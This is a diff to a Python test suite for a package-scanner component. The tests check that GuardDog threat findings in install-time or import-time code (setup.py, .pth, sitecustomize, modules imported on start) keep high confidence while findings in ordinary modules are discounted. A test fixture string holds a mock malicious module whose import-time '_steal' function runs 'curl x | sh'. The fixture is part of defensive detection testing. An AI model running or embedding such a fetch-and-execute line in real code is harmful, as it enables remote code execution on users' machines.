@@ -38,32 +38,100 @@ def test_guarddog_findings_become_signals(tmp_path: Path) -> None:
     assert by_rule["guarddog.capability-process-spawn"].severity is Severity.LOW
 
 
+def threat_at(tmp_path: Path, path: str, line: int = 1, source: str = "x = 1\n") -> str:
+    """The rule a threat finding at `path` gets; the file exists, as GuardDog found it there."""
+    target = tmp_path / path
+    target.parent.mkdir(parents=True, exist_ok=True)
+    target.write_text(source)
+    results = {"threat-x": [{"location": f"{path}:{line}", "message": "m"}]}
+    signal = normalize_results(results, {}, tmp_path)[0]
+    if signal.rule_id.startswith("guarddog.install."):
+        assert signal.confidence == pytest.approx(0.7)
+    else:
+        assert signal.confidence == pytest.approx(0.14)
+    return signal.rule_id
+
+
 @pytest.mark.parametrize(
     "path",
     [
         "a.tar.gz/a-1.0/setup.py",
         "a.whl/a/__init__.py",
         "a.tar.gz/a-1.0/a/__init__.py",
+        "a.tar.gz/a-1.0/src/a/__init__.py",
         "a.whl/evil.pth",
+        "a.whl/a-1.0.data/purelib/a/__init__.py",
+        "a.whl/a-1.0.data/platlib/a/__init__.py",
+        "a.whl/sitecustomize.py",
+        "a.whl/a-1.0.data/purelib/usercustomize.py",
     ],
 )
 def test_threats_in_code_that_runs_by_itself_keep_their_weight(path: str, tmp_path: Path) -> None:
-    results = {"threat-x": [{"location": f"{path}:1", "message": "m"}]}
-
-    signal = normalize_results(results, {}, tmp_path)[0]
-
-    assert signal.rule_id == "guarddog.install.threat-x"
-    assert signal.confidence == pytest.approx(0.7)
+    assert threat_at(tmp_path, path) == "guarddog.install.threat-x"
 
 
-@pytest.mark.parametrize("path", ["a.whl/a/cli.py", "a.tar.gz/a-1.0/a/b/c/__init__.py"])
+@pytest.mark.parametrize(
+    "path",
+    [
+        "a.whl/a/cli.py",
+        "a.tar.gz/a-1.0/a/b/c/__init__.py",
+        "a.tar.gz/a-1.0/tests/fixtures/setup.py",
+        "a.tar.gz/a-1.0/a/sitecustomize.py",
+    ],
+)
 def test_threats_in_ordinary_modules_are_discounted(path: str, tmp_path: Path) -> None:
-    results = {"threat-x": [{"location": f"{path}:1", "message": "m"}]}
+    assert threat_at(tmp_path, path) == "guarddog.threat-x"
 
-    signal = normalize_results(results, {}, tmp_path)[0]
 
-    assert signal.rule_id == "guarddog.threat-x"
-    assert signal.confidence == pytest.approx(0.14)
+PAYLOAD = """import os
+
+
+def helper():
+    return 1
+
+
+def _steal():
+    os.system("curl x | sh")
+
+
+_steal()
+
+if __name__ == "__main__":
+    os.system("y")
+"""
+
+
+def test_a_module_imported_on_start_runs_by_itself_in_its_import_time_lines(
+    tmp_path: Path,
+) -> None:
+    (tmp_path / "a.whl/a").mkdir(parents=True)
+    (tmp_path / "a.whl/a/__init__.py").write_text("from ._core import helper\n")
+
+    assert threat_at(tmp_path, "a.whl/a/_core.py", 9, PAYLOAD) == "guarddog.install.threat-x"
+    # Neither a function nobody calls on import nor the `__main__` block runs.
+    assert threat_at(tmp_path, "a.whl/a/_core.py", 5, PAYLOAD) == "guarddog.threat-x"
+    assert threat_at(tmp_path, "a.whl/a/_core.py", 15, PAYLOAD) == "guarddog.threat-x"
+
+
+def test_the_import_graph_follows_chains_and_setup_py(tmp_path: Path) -> None:
+    root = tmp_path / "a.tar.gz/a-1.0"
+    (root / "src/a/sub").mkdir(parents=True)
+    (root / "setup.py").write_text("def version():\n    from a.sub import meta\n")
+    (root / "src/a/__init__.py").write_text("")
+    (root / "src/a/sub/__init__.py").write_text("from . import deep\n")
+    (root / "src/a/sub/deep.py").write_text("import os\nos.system('x')\n")
+
+    assert threat_at(
+        tmp_path, "a.tar.gz/a-1.0/src/a/sub/deep.py", 2, "import os\nos.system('x')\n"
+    ) == ("guarddog.install.threat-x")
+    assert threat_at(tmp_path, "a.tar.gz/a-1.0/src/a/sub/meta.py", 1) == "guarddog.install.threat-x"
+
+
+def test_a_module_nothing_imports_on_start_is_ordinary(tmp_path: Path) -> None:
+    (tmp_path / "a.whl/a").mkdir(parents=True)
+    (tmp_path / "a.whl/a/__init__.py").write_text("def lazy():\n    from . import _core\n")
+
+    assert threat_at(tmp_path, "a.whl/a/_core.py", 9, PAYLOAD) == "guarddog.threat-x"
 
 
 def test_clean_code_gives_no_threats(tmp_path: Path) -> None:
